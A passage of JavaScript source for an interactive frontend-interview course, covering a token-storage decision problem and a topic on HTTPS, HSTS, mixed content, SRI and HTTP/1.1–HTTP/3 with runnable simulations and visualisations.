    level: 'Medium', tags: ['auth', 'JWT', 'cookies', 'XSS', 'CSRF'], companies: ['Auth0', 'Okta', 'Netflix'],
    statement: `<p>Write <code>chooseTokenStorage(app)</code> returning <code>{ choice, why }</code> (<code>why</code> is an array of short strings). <code>app</code> has booleans <code>needsEmbedding</code>, <code>apiSameSite</code>, <code>highValue</code>, <code>strictCsp</code> and a number <code>tokenMinutes</code>. Apply these rules in order: (1) <code>needsEmbedding</code> → <code>'HttpOnly cookie, SameSite=None; Secure; Partitioned'</code>; (2) <code>apiSameSite</code> → <code>'HttpOnly session cookie (SameSite=Lax)'</code>; (3) <code>highValue</code> → <code>'BFF + session cookie'</code>; (4) <code>strictCsp</code> and <code>tokenMinutes ≤ 15</code> → <code>'localStorage short-lived token (accepted risk)'</code>; (5) otherwise <code>'access token in memory + HttpOnly refresh cookie'</code>. Every answer includes at least one reason, and cookie-based answers must mention CSRF protection.</p>`,
    constraints: `Missing booleans are treated as false; missing <code>tokenMinutes</code> is treated as 60.`,
    example: `${H.table(['App', 'Answer'], [['server-rendered shop on one site', 'HttpOnly session cookie (SameSite=Lax) + CSRF protection'], ['bank on two sites', 'BFF + session cookie'], ['weather SPA, strict CSP, 10-minute token', 'localStorage short-lived token (accepted risk)'], ['notes SPA, weak CSP', 'access token in memory + HttpOnly refresh cookie']])}<p>Why: the order encodes "what breaks first" (embeds), then "simplest safe" (same site), then risk level.</p>`,
    brute: {
      why: `<p>The naive answer is a single global rule such as "always localStorage, it is the easiest" or "always cookies". Both ignore context: localStorage makes an XSS bug into long-lived account takeover for banking apps; plain cookies for a cross-site embed simply do not get sent, and cookies without CSRF protection invite forged requests.</p>`,
      code: `function chooseBrute() {
  // One-size-fits-all: ignores XSS risk, CSRF risk and cross-site behaviour
  return { choice: 'localStorage', why: ['easy'] };
}`
    },
    mcq: { q: 'An attacker injects a script into your page. Which storage choice stops them from COPYING the credential and using it from their own laptop tomorrow?', options: ['localStorage', 'sessionStorage', 'HttpOnly cookie', 'A global JS variable named token'], answer: 2, explain: 'HttpOnly cookies cannot be read by JavaScript, so the credential cannot be exported. The script can still make requests as the user while it runs, but it cannot take the session away.' },
    hints: [
      `<p>Hint 1: This is a rules engine. The order of the rules matters: the first matching rule wins.</p>`,
      `<p>Hint 2: Return reasons together with the choice, so the recommendation is explainable in a design review. Remember to mention CSRF for the cookie answers.</p>`,
      `<p>Hint 3: Recipe: normalise inputs (<code>!!</code> for booleans, default 60 minutes); then an if / else-if chain over the five rules; push 1-2 reason strings per branch.</p>`
    ],
    solution: {
      approach: `<p>Put the rule order in the code exactly as in the statement and let each branch explain itself. The explanation strings matter as much as the label: in an interview you should always say <em>why</em>.</p>`,
      code: {
        lang: 'js', run: true, code: `function chooseTokenStorage(app) {
  var a = {
    needsEmbedding: !!app.needsEmbedding, apiSameSite: !!app.apiSameSite,
    highValue: !!app.highValue, strictCsp: !!app.strictCsp,
    tokenMinutes: typeof app.tokenMinutes === 'number' ? app.tokenMinutes : 60
  };
  if (a.needsEmbedding) {
    return { choice: 'HttpOnly cookie, SameSite=None; Secure; Partitioned',
      why: ['runs inside third-party frames, cookie must be sent cross-site', 'add CSRF protection: SameSite no longer helps'] };
  }
  if (a.apiSameSite) {
    return { choice: 'HttpOnly session cookie (SameSite=Lax)',
      why: ['UI and API share a site', 'add CSRF protection for non-GET requests'] };
  }
  if (a.highValue) {
    return { choice: 'BFF + session cookie', why: ['high value: keep OAuth tokens on the server'] };
  }
  if (a.strictCsp && a.tokenMinutes <= 15) {
    return { choice: 'localStorage short-lived token (accepted risk)', why: ['low value + strict CSP + short TTL limit XSS damage'] };
  }
  return { choice: 'access token in memory + HttpOnly refresh cookie',
    why: ['different sites: keep the access token out of storage', 'rotate refresh tokens; protect /refresh from CSRF'] };
}

console.log(JSON.stringify(chooseTokenStorage({ apiSameSite: true })));
console.log(JSON.stringify(chooseTokenStorage({ highValue: true })));
console.log(JSON.stringify(chooseTokenStorage({ strictCsp: true, tokenMinutes: 10 })));
console.log(JSON.stringify(chooseTokenStorage({ strictCsp: false })));
console.log(JSON.stringify(chooseTokenStorage({ needsEmbedding: true, apiSameSite: true })));`
      },
      dry: {
        head: ['App facts', 'rule hit', 'choice'],
        rows: [
          ['apiSameSite', '2', 'HttpOnly session cookie (SameSite=Lax)'],
          ['highValue, cross-site', '3', 'BFF + session cookie'],
          ['strictCsp, 10 min', '4', 'localStorage short-lived token (accepted risk)'],
          ['strictCsp false, cross-site', '5', 'memory + HttpOnly refresh cookie']
        ]
      },
      complexity: `<p>O(1) time and space.</p>`,
      followUps: ['What would you change for a native mobile app?', 'How does adding DPoP change the ranking?']
    }
  }]
});

/* ============================ TOPIC 8: HTTPS, HTTP/2, HTTP/3 ============================ */
topics.push({
  title: 'HTTPS, HTTP/2 and HTTP/3 for Frontend Engineers',
  analogy: `<p><b>HTTPS</b> is a <b>sealed, tamper-proof envelope</b> with a verified return address: nobody in the post office (Wi-Fi, ISP) can read or change your letter, and you know it really came from the shop. The versions of HTTP are different <b>delivery trucks</b>. HTTP/1.1 is a van that carries <em>one parcel at a time</em> per lane, so browsers open 6 lanes and parcels queue up behind slow ones. HTTP/2 is one big truck with <b>many labelled compartments</b>: all parcels travel together (multiplexing), but if the truck hits a pothole (a lost packet) the whole truck waits. HTTP/3 gives every compartment <b>its own little van</b> on the same road (QUIC), so a pothole only delays one parcel.</p>`,
  explain: `<h4>HTTPS = HTTP over TLS</h4>
  <p>TLS gives three things: <b>encryption</b> (nobody can read), <b>integrity</b> (nobody can alter) and <b>authentication</b> (a certificate from a trusted Certificate Authority proves the server owns the domain). Modern sites use TLS 1.3: the handshake takes one round trip, and a returning visitor can use session resumption. Free certificates (Let’s Encrypt) and automatic renewal removed all excuses; browsers mark HTTP pages "Not secure" and many powerful APIs only work in a <b>secure context</b> (HTTPS or localhost): service workers, geolocation, camera/microphone, clipboard, WebAuthn, <code>crypto.subtle</code>.</p>
  <ul>
    <li><b>HSTS</b> (<code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>): "for the next year only ever talk HTTPS to me". It stops SSL-stripping on public Wi-Fi after the first visit; the <b>preload list</b> protects even the first visit.</li>
    <li><b>Mixed content</b>: an HTTPS page that loads <code>http://</code> subresources. Active content (scripts, iframes, fetch) is <b>blocked</b>; passive content (images, audio, video) is auto-upgraded to https or warned. Fix with real https URLs, relative URLs, or <code>Content-Security-Policy: upgrade-insecure-requests</code>.</li>
    <li><b>Secure cookies</b>: <code>Secure</code> makes cookies travel only over HTTPS (previous topics).</li>
    <li><b>SRI</b> (Subresource Integrity): <code>&lt;script src=... integrity="sha384-..." crossorigin="anonymous"&gt;</code> makes the browser verify a CDN file’s hash before running it.</li>
  </ul>
  <h4>HTTP/1.1 vs HTTP/2 vs HTTP/3</h4>
  ${H.table(['', 'HTTP/1.1', 'HTTP/2', 'HTTP/3'], [
    ['Transport', 'TCP (+TLS)', 'TCP + TLS (ALPN picks h2)', H.c('g', 'QUIC over UDP (TLS 1.3 built in)')],
    ['Format', 'Text', 'Binary frames, one connection', 'Binary frames, QUIC streams'],
    ['Parallel requests', 'About 6 connections per host, one request at a time on each', H.c('g', 'Many streams multiplexed on one connection'), H.c('g', 'Many independent streams')],
    ['Head-of-line blocking', H.c('r', 'In HTTP: a slow response blocks the connection'), H.c('y', 'Fixed in HTTP, but TCP still blocks ALL streams on one lost packet'), H.c('g', 'Only the stream with the lost packet waits')],
    ['Headers', 'Repeated in full every request', 'HPACK compression', 'QPACK compression'],
    ['Connection setup', 'TCP 1 RTT + TLS 1-2 RTT', 'Same (TCP + TLS 1.3 = 2 RTT)', H.c('g', '1 RTT (0-RTT for returning visitors)')],
    ['Network change (Wi-Fi → 4G)', 'New connection', 'New connection', H.c('g', 'Connection migration by Connection ID')]
  ])}
  <p><b>How the browser gets HTTP/3:</b> it first connects with HTTP/2 (or sees DNS HTTPS records), the server says <code>Alt-Svc: h3=":443"; ma=86400</code> ("I also speak HTTP/3 on UDP 443"), and the browser uses it from then on, falling back to HTTP/2 if UDP is blocked.</p>
  <h4>What this changes in your frontend habits</h4>
  <ul>
    <li><b>Stop domain sharding</b> (cdn1, cdn2, cdn3...). It was a trick to get more HTTP/1.1 connections; under HTTP/2 it costs extra DNS/TLS and hurts prioritisation.</li>
    <li><b>Image sprites and giant concatenated bundles</b> matter less, but do not go to the other extreme: hundreds of tiny modules still cost per-request overhead and hurt compression. Aim for sensible chunks.</li>
    <li><b>Server push is gone</b> (removed from Chrome). Use <code>&lt;link rel="preload"&gt;</code>, <code>fetchpriority</code> and 103 Early Hints.</li>
    <li>Cache well (<code>Cache-Control</code>, hashed filenames) and use a CDN: the biggest wins are still fewer bytes and shorter distance.</li>
  </ul>`,
  clues: [
    '"Why is HTTP/2 faster?" → multiplexing, header compression, single connection (no 6-connection limit)',
    '"HTTP/2 still stalls on packet loss" → TCP head-of-line blocking → HTTP/3 (QUIC)',
    '"Mixed content warning / blocked script" → http:// subresource on an https page',
    '"First visit over HTTP gets downgraded" → HSTS and the preload list',
    '"Third-party script from a CDN could be tampered with" → Subresource Integrity',
    '"Which API only works on HTTPS?" → secure contexts: service worker, geolocation, getUserMedia, WebAuthn',
    '"Domain sharding / sprites / concatenation" → HTTP/1.1 era tricks that are obsolete or harmful under HTTP/2+'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Simulate HTTP/1.1 vs HTTP/2 loading (runs in your browser)',
      code: `// Each resource needs 'size' time units of server+network time (think latency-dominated small files).
// HTTP/1.1: at most 'conns' parallel connections, each handles ONE request at a time, in order.
// HTTP/2  : one connection, every request becomes a stream that starts immediately.
function simulate(sizes, protocol, conns) {
  var finish = [];
  if (protocol === 'h2') {
    sizes.forEach(function (s) { finish.push(s); });          // all streams start at time 0
  } else {
    var free = [];                                              // when each connection becomes free
    for (var c = 0; c < conns; c++) free.push(0);
    sizes.forEach(function (s) {
      var best = 0;
      for (var k = 1; k < conns; k++) if (free[k] < free[best]) best = k;   // earliest free connection
      free[best] += s;
      finish.push(free[best]);
    });
  }
  return { finish: finish, total: Math.max.apply(null, finish) };
}

var sizes = [3, 1, 2, 1, 4, 1, 2, 2];       // big resource first, small ones queue behind it
var names = 'ABCDEFGH'.split('');
var h1 = simulate(sizes, 'h1', 3);
var h2 = simulate(sizes, 'h2');
console.log('resource: ' + names.join('  '));
console.log('sizes   : ' + sizes.join('  '));
console.log('HTTP/1.1 finish times (3 conns): ' + h1.finish.join('  ') + '  -> page done at t=' + h1.total);
console.log('HTTP/2   finish times (1 conn) : ' + h2.finish.join('  ') + '  -> page done at t=' + h2.total);
var avg1 = h1.finish.reduce(function (a, b) { return a + b; }, 0) / sizes.length;
var avg2 = h2.finish.reduce(function (a, b) { return a + b; }, 0) / sizes.length;
console.log('average completion time: HTTP/1.1 = ' + avg1.toFixed(2) + ', HTTP/2 = ' + avg2.toFixed(2));`
    },
    {
      lang: 'http', title: 'Headers that make HTTPS and HTTP/3 work',
      code: `HTTP/2 200
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Alt-Svc: h3=":443"; ma=86400
Content-Security-Policy: upgrade-insecure-requests
Link: </assets/app.4f9c2a.css>; rel=preload; as=style
Cache-Control: public, max-age=31536000, immutable

# Redirect plain http to https, once, at the edge:
# HTTP/1.1 301 Moved Permanently
# Location: https://www.example.com/`
    },
    {
      lang: 'html', title: 'SRI and preload in the page',
      code: `<!-- The browser hashes the downloaded file and refuses to run it if it does not match -->
<script src="https://cdn.example.com/lib/v2.1.0/lib.min.js"
        integrity="sha384-PLACEHOLDER_HASH_FROM_BUILD"
        crossorigin="anonymous"><\/script>

<!-- Tell the browser early about the most important resources (works with h2/h3 priorities) -->
<link rel="preload" href="/assets/hero.avif" as="image" fetchpriority="high">
<link rel="preconnect" href="https://api.example.com" crossorigin>

<!-- Avoid mixed content: use https:// or relative URLs, never http:// -->
<img src="/img/logo.png" alt="Logo">`
    },
    {
      lang: 'js', run: true, title: 'Mixed content classifier (runs in your browser)',
      code: `// What does the browser do with a subresource on an https page?
function mixedContentVerdict(pageUrl, resourceUrl, kind) {
  var page = new URL(pageUrl), res = new URL(resourceUrl, pageUrl);
  if (page.protocol !== 'https:' || res.protocol !== 'http:') return 'ok (no mixed content)';
  var passive = ['img', 'audio', 'video'].indexOf(kind) !== -1;
  return passive ? 'auto-upgraded to https (or blocked if the https URL fails)' : 'BLOCKED (active content)';
}
[
  ['https://shop.example/', 'http://shop.example/app.js', 'script'],
  ['https://shop.example/', 'http://shop.example/photo.jpg', 'img'],
  ['https://shop.example/', 'https://cdn.example/app.js', 'script'],
  ['https://shop.example/', '/api/data', 'fetch'],
  ['http://old.example/', 'http://old.example/app.js', 'script']
].forEach(function (c) { console.log(c[2].padEnd(7) + c[1].padEnd(34) + ' -> ' + mixedContentVerdict(c[0], c[1], c[2])); });`
    }
  ],
  codeTitle: ['HTTP/1.1 vs HTTP/2 simulation', 'HTTPS-related headers', 'SRI and preload', 'Mixed content classifier'],
  viz: [{
    title: 'HTTP/1.1 (3 connections) vs HTTP/2 (multiplexed) loading the same files',
    input: '3 1 2 1 4 1 2 2',
    inputLabel: 'Time each resource needs (1 to 5), space separated, up to 10',
    gen: function (input) {
      var s = String(input).trim().split(/[\s,]+/).map(Number);
      if (s.length < 2 || s.length > 10 || s.some(function (x) { return !(x >= 1 && x <= 5) || x % 1 !== 0; })) throw new Error('Enter 2 to 10 whole numbers between 1 and 5, e.g. 3 1 2 1 4');
      var n = s.length, C = 3;
      var names = 'ABCDEFGHIJ'.split('').slice(0, n);
      // HTTP/1.1 schedule
      var free = [0, 0, 0], h1 = []; // h1[i] = {c, start, end}
      for (var i = 0; i < n; i++) {
        var b = 0;
        for (var k = 1; k < C; k++) if (free[k] < free[b]) b = k;
        h1.push({ c: b, start: free[b], end: free[b] + s[i] });
        free[b] += s[i];
      }
      var T1 = Math.max.apply(null, free), T2 = Math.max.apply(null, s), T = Math.max(T1, T2);
      var colHead = []; for (var t = 1; t <= T; t++) colHead.push(String(t));
      function grid1(upto) {
        var rows = [], hl = {};
        for (var c = 0; c < C; c++) { rows.push(colHead.map(function () { return ''; })); }
        h1.forEach(function (r, idx) {
          for (var tt = r.start; tt < r.end && tt < upto; tt++) {
            rows[r.c][tt] = names[idx];
            hl[r.c + ',' + tt] = (tt === r.end - 1) ? 'ok' : 'win';
          }
        });
        return { rows: rows, hl: hl };
      }
      function grid2(upto) {
        var rows = [], hl = {};
        for (var i2 = 0; i2 < n; i2++) {
          rows.push(colHead.map(function () { return ''; }));
          for (var tt = 0; tt < s[i2] && tt < upto; tt++) { rows[i2][tt] = names[i2]; hl[i2 + ',' + tt] = (tt === s[i2] - 1) ? 'ok' : 'win'; }
        }
        return { rows: rows, hl: hl };
      }
      function done(sched, upto) { // finished resources at time upto
        return sched.filter(function (e) { return e <= upto; }).length;
      }
      var e1 = h1.map(function (r) { return r.end; }), e2 = s.slice();
      var frames = [];
      var g1 = grid1(0), g2 = grid2(0);
      frames.push({
        narr: 'We load <b>' + n + ' files</b> (' + names.join(', ') + ') whose "cost" is ' + s.join(', ') + ' time units. Real browsers open about 6 HTTP/1.1 connections per host; we use 3 so the picture stays small. Each cell is one time unit; the letter shows which file that connection or stream is busy with.',
        parts: [{ type: 'grid', label: 'HTTP/1.1: 3 connections, each does ONE request at a time', rows: g1.rows, rowHead: ['conn 1', 'conn 2', 'conn 3'], colHead: colHead },
          { type: 'grid', label: 'HTTP/2: one connection, one stream per file', rows: g2.rows, rowHead: names, colHead: colHead }]
      });
      for (var tm = 1; tm <= T; tm++) {
        g1 = grid1(tm); g2 = grid2(tm);
        var d1 = done(e1, tm), d2 = done(e2, tm), q = [];
        for (var j = 0; j < n; j++) if (h1[j].start >= tm) q.push(names[j]);
        frames.push({
          narr: 'Time <b>' + tm + '</b>. HTTP/1.1 has finished <b>' + d1 + '</b> of ' + n + ' files' + (q.length ? ' and <span class="c-r">' + q.join(', ') + ' are still waiting in the queue for a free connection</span>' : '') + '. HTTP/2 has finished <b>' + d2 + '</b> of ' + n + ' because every request is already in flight on its own stream.',
          parts: [{ type: 'grid', label: 'HTTP/1.1: 3 connections', rows: g1.rows, rowHead: ['conn 1', 'conn 2', 'conn 3'], colHead: colHead, hl: g1.hl },
            { type: 'grid', label: 'HTTP/2: multiplexed streams', rows: g2.rows, rowHead: names, colHead: colHead, hl: g2.hl }]
        });
      }
      var a1 = e1.reduce(function (x, y) { return x + y; }, 0) / n, a2 = e2.reduce(function (x, y) { return x + y; }, 0) / n;
      frames.push({
        narr: 'Result: HTTP/1.1 finishes at <b>t = ' + T1 + '</b>, HTTP/2 at <b>t = ' + T2 + '</b>. Average completion time ' + a1.toFixed(1) + ' vs ' + a2.toFixed(1) + '. The big win is that small files never wait behind big ones. (Real bandwidth is shared, so the gain is smaller than this latency-only model, but the queueing effect is real.)',
        parts: [{ type: 'vars', label: 'Summary', vals: { 'HTTP/1.1 page done': T1, 'HTTP/2 page done': T2, 'avg finish 1.1': a1.toFixed(1), 'avg finish h2': a2.toFixed(1) }, hl: { 'HTTP/2 page done': 'ok', 'HTTP/1.1 page done': 'bad' } }]
      });
      return frames;
    }
  }, {
    title: 'One lost packet: HTTP/2 over TCP vs HTTP/3 over QUIC',
    input: '4',
    inputLabel: 'Which packet is lost (1 to 9)',
    gen: function (input) {
      var L = parseInt(String(input).trim(), 10);
      if (!(L >= 1 && L <= 9)) throw new Error('Enter a packet number from 1 to 9');
      var N = 9, S = ['A', 'B', 'C'];
      var colHead = []; for (var i = 1; i <= N; i++) colHead.push('pkt ' + i);
      function owner(k) { return (k - 1) % 3; } // packet k belongs to stream owner(k)
      function mk(stateFn) {
        var rows = [[], [], []], hl = {};
        for (var r = 0; r < 3; r++) for (var c = 0; c < N; c++) rows[r].push('');
        for (var k = 1; k <= N; k++) {
          var st = stateFn(k);
          rows[owner(k)][k - 1] = st.t;
          hl[owner(k) + ',' + (k - 1)] = st.h;
        }
        return { rows: rows, hl: hl };
      }
      var inflight = function (k) { return { t: 'sent', h: 'win' }; };
      var tcpLoss = function (k) { return k < L ? { t: 'ok', h: 'ok' } : (k === L ? { t: 'LOST', h: 'bad' } : { t: 'held', h: 'cur' }); };
      var quicLoss = function (k) { return k < L ? { t: 'ok', h: 'ok' } : (k === L ? { t: 'LOST', h: 'bad' } : (owner(k) === owner(L) ? { t: 'held', h: 'cur' } : { t: 'ok', h: 'ok' })); };
      var allok = function (k) { return { t: 'ok', h: 'ok' }; };
      var tcpHeld = 0, quicHeld = 0;
      for (var k2 = L + 1; k2 <= N; k2++) { tcpHeld++; if (owner(k2) === owner(L)) quicHeld++; }
      var G = function (fn, label) { var g = mk(fn); return { type: 'grid', label: label, rows: g.rows, rowHead: S.map(function (x) { return 'stream ' + x; }), colHead: colHead, hl: g.hl }; };
      var frames = [];
      frames.push({ narr: 'Three streams (A = HTML, B = CSS, C = JS) share one connection. The server sends nine packets, taking turns between streams. We compare how the <b>receiver</b> handles them.', parts: [G(inflight, 'HTTP/2 over TCP: one ordered byte stream'), G(inflight, 'HTTP/3 over QUIC: independent streams')] });
      frames.push({ narr: 'Packet <b>' + L + '</b> (stream ' + S[owner(L)] + ') is <span class="c-r">lost</span> on the network. The later packets still arrive at the receiver.', parts: [G(tcpLoss, 'HTTP/2 over TCP'), G(quicLoss, 'HTTP/3 over QUIC')] });
      frames.push({
        narr: 'TCP promises the app an in-order byte stream, so it must <b>hold back all ' + tcpHeld + ' later packets from every stream</b> until packet ' + L + ' is resent. QUIC knows which stream each packet belongs to, so only <b>' + quicHeld + ' packet(s) of stream ' + S[owner(L)] + '</b> wait; the other streams keep delivering data to the page.',
        parts: [G(tcpLoss, 'HTTP/2 over TCP: ' + tcpHeld + ' packets stuck'), G(quicLoss, 'HTTP/3 over QUIC: ' + quicHeld + ' packets stuck'),
          { type: 'vars', label: 'Stuck behind the loss', vals: { 'HTTP/2 (TCP)': tcpHeld + ' packets, all streams', 'HTTP/3 (QUIC)': quicHeld + ' packets, one stream' }, hl: { 'HTTP/2 (TCP)': 'bad', 'HTTP/3 (QUIC)': 'ok' } }]
      });
      frames.push({ narr: 'The sender retransmits packet ' + L + ' (about one round trip later). Now everything is delivered. On a lossy mobile network this "one packet stalls everything" effect is the main reason HTTP/3 feels faster.', parts: [G(allok, 'HTTP/2 over TCP: recovered'), G(allok, 'HTTP/3 over QUIC: recovered')] });
      return frames;
    }
  }],
  examples: [
    {
      title: 'Round trips before the first byte of HTML',
      html: `<p>Latency adds up before any content arrives. With 100 ms round-trip time (RTT):</p>
      ${H.table(['Setup', 'Round trips', 'Time to first request sent'], [['HTTP/1.1 + TLS 1.2', 'TCP 1 + TLS 2', '300 ms'], ['HTTP/2 + TLS 1.3', 'TCP 1 + TLS 1', '200 ms'], ['HTTP/3 (QUIC, new visitor)', '1', '100 ms'], ['HTTP/3 with 0-RTT resumption', '0', '0 ms (data goes in the first packet)']])}
      <p>0-RTT data can be <b>replayed</b> by an attacker, so servers should accept it only for safe, idempotent requests (GET). Frontend lesson: a first connection to a far-away server is expensive; use a CDN near the user and <code>&lt;link rel="preconnect"&gt;</code> for origins you will certainly use.</p>`
    },
    {
      title: 'Mixed content: the https page with one http script',
      html: `<p>You moved your site to HTTPS but a template still has <code>&lt;script src="http://cdn.example/app.js"&gt;</code>. Chrome, Firefox and Safari <b>block</b> it, the page breaks, and the console says <i>Mixed Content</i>. An <code>http://</code> image is auto-upgraded to https (and fails if that URL does not exist). Quick fix: use https or protocol-relative/absolute-path URLs. Safety net: <code>Content-Security-Policy: upgrade-insecure-requests</code> rewrites old <code>http://</code> links for you, but still fix the sources.</p>`
    },
    {
      title: 'HSTS: closing the first-request hole',
      html: `<p>You type <code>shop.com</code> in a cafe. The browser first tries <code>http://shop.com</code> and the site redirects to https. An attacker on the Wi-Fi can answer the http request himself and keep you on plain http ("SSL stripping"). After one successful HTTPS visit with <code>Strict-Transport-Security</code>, the browser rewrites future http attempts to https <em>before</em> sending anything. Add the domain to the <b>preload list</b> (hstspreload.org) and browsers ship with it hard-coded, closing even the first visit. Careful: <code>includeSubDomains; preload</code> commits every subdomain to HTTPS for a long time and is hard to undo.</p>`
    },
    {
      title: 'Optimising for HTTP/2: what to change',
      html: `<p>Old advice vs now:</p>
      ${H.table(['HTTP/1.1 trick', 'Under HTTP/2/3'], [['Domain sharding (img1., img2.)', H.c('r', 'Remove. More connections, lost prioritisation')], ['Concatenate everything into one JS file', H.c('y', 'Split by route, keep chunks cache-friendly')], ['CSS image sprites', H.c('y', 'Optional; icons as SVG/inline are fine')], ['Inline small resources', H.c('y', 'Only critical CSS')], ['Server push', H.c('r', 'Removed; use preload / 103 Early Hints')], ['Keep-alive tuning', H.c('g', 'Automatic: one long-lived connection')]])}`
    }
  ],
  deepDive: `<p><b>The TLS 1.3 handshake.</b> ClientHello (supported ciphers + key share + SNI + ALPN) → ServerHello (chosen cipher + its key share) + encrypted Certificate + Finished. Both sides derive keys from an ephemeral Diffie-Hellman exchange (forward secrecy: a stolen server key cannot decrypt old traffic). The browser validates the certificate chain up to a trusted root, checks the hostname (Subject Alternative Names), validity dates, and Certificate Transparency logs. ALPN is how the client and server agree on <code>h2</code> or <code>http/1.1</code> inside this one handshake.</p>
  <p><b>HTTP/2 details.</b> One TCP connection carries many <i>streams</i>; each message is split into <i>frames</i> (HEADERS, DATA...), tagged with a stream id and interleaved. HPACK compresses repeated headers using a dynamic table (cookies are the bulk of header bytes). Flow control per stream and per connection prevents one big download from starving others. Priorities: the old tree-based scheme was complex and inconsistently implemented; the newer <code>Priority</code> header / <code>fetchpriority</code> attribute (RFC 9218) is simpler. Server push was removed because it rarely helped and often wasted bandwidth.</p>
  <p><b>HTTP/3 and QUIC details.</b> QUIC runs over UDP port 443 in user space, so it evolves without OS updates. It integrates TLS 1.3, gives each stream independent loss recovery, uses a Connection ID (so a phone moving from Wi-Fi to 4G keeps the connection), and pads/encrypts almost all headers, which also makes middlebox meddling harder. Costs: more CPU (user-space crypto, UDP offload still maturing), some corporate networks block UDP so you must keep HTTP/2 as a fallback, and debugging needs tools that understand QUIC (Chrome <code>net-export</code>, qlog, Wireshark with keys).</p>
  <p><b>Security knobs for the frontend.</b> Use TLS 1.2+ only (disable 1.0/1.1); OCSP stapling; HSTS with a sensible <code>max-age</code> (ramp from minutes to a year); <code>Secure</code> cookies; CAA DNS records; CT monitoring to detect rogue certificates for your domain; short-lived certificates with automatic renewal; certificate pinning in browsers is dead (HPKP removed), mobile apps may pin carefully. Subresource Integrity protects against a compromised CDN but requires CORS-enabled responses (<code>crossorigin="anonymous"</code>) and a new hash whenever the file changes.</p>
  <p><b>Performance reality check.</b> HTTP/2 helps most with many small assets on high-latency links. On fast networks, a well-bundled HTTP/1.1 site can be equal. HTTP/3 helps most on lossy or changing mobile networks and for first-connection latency. Always measure real-user metrics (LCP, INP, TTFB by protocol) rather than assuming. Also remember <code>performance.getEntriesByType('navigation')[0].nextHopProtocol</code> tells you which protocol (<code>h2</code>, <code>h3</code>) a page used.</p>
  <p><b>Everything-is-https consequences.</b> The Referer is trimmed when going http → https and by default to the origin on cross-origin (<code>strict-origin-when-cross-origin</code>); localhost is exempt from the HTTPS requirement in dev; <code>mkcert</code> gives you trusted local certificates for testing; service workers and PWAs need HTTPS; WebSocket must be <code>wss://</code> from an https page.</p>`,
  aiEra: `<p><b>What AI changes:</b> AI crawlers, agents and API clients all speak HTTPS, but they are less forgiving than browsers about certificate and redirect mistakes, so a broken chain or a missing HSTS redirect now hurts discoverability as well as security. LLM-assisted tooling can read a HAR file or WebPageTest result and point out protocol-level problems: HTTP/1.1 fallback, sharded domains, missing preconnect, mixed content, uncompressed headers.</p>
  <p><b>Use AI as a partner:</b> paste a HAR (with cookies and tokens removed) and ask <code>Which requests used h2 or h3? Which origins cost the most connection setup time? Suggest preconnect and priority hints.</code> Ask it to explain a TLS error message or to draft an nginx/Cloudflare config, then verify with SSL Labs and <code>curl -I --http3</code>.</p>
  <p><b>Where AI goes wrong:</b> it still recommends HTTP/1.1-era tricks (sharding, mass concatenation), suggests HTTP/2 server push (removed), invents <code>Alt-Svc</code> syntax, advises <code>--insecure</code> or disabling certificate checks in tutorials, and forgets that HSTS <code>preload</code> is a long-term commitment.</p>
  <p><b>What you must still own:</b> certificate renewal automation and monitoring, the HSTS rollout plan, knowing which origins you load third-party code from (SRI, CSP), and measuring the actual effect of protocol changes with real-user data instead of benchmarks alone.</p>`,
  problems: [{
    title: 'Simulate HTTP/1.1 vs HTTP/2 Page Load',
    level: 'Medium', tags: ['HTTP/2', 'multiplexing', 'simulation', 'scheduling'], companies: ['Cloudflare', 'Akamai', 'Google'],
    statement: `<p>You are given <code>sizes</code>, the time each resource needs (in order of request). Write <code>compare(sizes, conns)</code> that returns <code>{ h1, h2 }</code> where each is <code>{ finish, total, average }</code>. For HTTP/1.1, requests are handed in order to the connection that becomes free earliest (ties: lowest index); each connection serves one request at a time. For HTTP/2, all requests start at time 0 on separate streams, so each finishes at its own size. <code>total</code> is the time the last resource finishes; <code>average</code> is the mean finish time.</p>`,
    constraints: `1 ≤ sizes.length ≤ 1000, 1 ≤ sizes[i] ≤ 100, 1 ≤ conns ≤ 16.`,
    example: `<p>sizes = [3, 1, 2, 1, 4, 1, 2, 2], conns = 3.</p>${H.table(['Protocol', 'Finish times', 'Total', 'Average'], [['HTTP/1.1', '3, 1, 2, 2, 6, 3, 5, 5', '6', '3.375'], ['HTTP/2', '3, 1, 2, 1, 4, 1, 2, 2', '4', '2.0']])}<p>Why: in HTTP/1.1, D must wait for B to free connection 2 (time 1), so it ends at 2; E (size 4) then starts at 2 on the same connection and ends at 6, the last to finish. Every file waits behind earlier ones. In HTTP/2 nobody waits.</p>`,
    brute: {
      why: `<p>A naive version simulates every time unit by scanning all connections and all resources (O(T · n · conns)). That is slow for large inputs, and it is also easy to get the tie-breaking wrong. The event is simple: a connection is busy until a known time, so you only need to track "free at" for each connection and place requests one by one.</p>`,
      code: `function compareBrute(sizes, conns) {
  // Tick-by-tick simulation: O(totalTime * conns * n), much more work than needed
  var remaining = sizes.slice(), next = 0, busy = [], finish = new Array(sizes.length).fill(0), t = 0;
  for (var c = 0; c < conns; c++) busy.push(-1);
  while (finish.some(function (f) { return f === 0; })) {
    for (var k = 0; k < conns; k++) if (busy[k] === -1 && next < sizes.length) busy[k] = next++;
    t++;
    for (var k2 = 0; k2 < conns; k2++) {
      var r = busy[k2];
      if (r !== -1 && --remaining[r] === 0) { finish[r] = t; busy[k2] = -1; }
    }
  }
  return finish;
}`
    },
    mcq: { q: 'Why does HTTP/2 over TCP still stall ALL streams when one packet is lost, while HTTP/3 does not?', options: ['HTTP/2 uses larger packets', 'TCP delivers one ordered byte stream, so everything after the lost packet waits; QUIC tracks loss per stream', 'HTTP/3 has no encryption', 'HTTP/3 opens six connections'], answer: 1, explain: 'TCP guarantees in-order delivery for the whole connection. HTTP/2 multiplexes streams on top of that single ordered stream. QUIC provides independent streams, so loss on one does not block others.' },
    hints: [
      `<p>Hint 1: Think in terms of "when is each connection free?" rather than ticking a clock.</p>`,
      `<p>Hint 2: Keep an array <code>free[c]</code>. For each request in order pick the connection with the smallest <code>free[c]</code>, add the size to it; the new <code>free[c]</code> is that request’s finish time. HTTP/2 is just <code>finish[i] = sizes[i]</code>.</p>`,
      `<p>Hint 3: Recipe: <code>free = Array(conns).fill(0)</code>; loop requests; <code>best = argmin(free)</code>; <code>free[best] += s</code>; push. Then compute total = max, average = sum / n for both. Return both objects.</p>`
    ],
    solution: {
